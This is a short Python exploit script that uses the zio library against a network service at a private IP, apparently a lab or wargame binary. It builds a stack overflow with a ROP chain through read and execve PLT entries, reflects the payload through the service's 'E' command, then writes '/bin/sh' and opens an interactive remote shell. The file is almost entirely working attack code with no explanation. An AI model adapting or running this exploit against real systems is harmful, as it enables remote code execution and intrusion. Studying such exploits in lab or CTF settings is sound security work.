# http://blog.chinaunix.net/uid-24774106-id-3349549.html
# ROPgadget -file filename -g

from zio import *

pppt = 0x08048b0f

read_plt = 0x08048860
read_arg1 = 0
read_arg2 = 0x0804b420
read_arg3 = 8

exe_plt = 0x080489b0
exe_arg1 = 0x0804b420
exe_arg2 = 0
exe_arg3 = 0

exit_plt = 0x08048960

junk = "A"*(32*4096+16)
io = zio(("192.168.222.132", 20002))
io.read_until("\n")
io.write("E"+l32(len(junk)+40)+junk+l32(read_plt)+l32(pppt)+l32(read_arg1)+l32(read_arg2)+l32(read_arg3)+l32(exe_plt)+l32(exit_plt)+l32(exe_arg1)+l32(exe_arg2)+l32(exe_arg3))
io.read_until("\n")
io.read(4)
ct = io.read(len(junk)+40)
io.write("E"+l32(len(junk)+40)+ct+"Q")
io.read_until("\n")
io.read(4)
pt = io.read(len(junk)+4)
io.writeline("/bin/sh\x00")
io.interact()
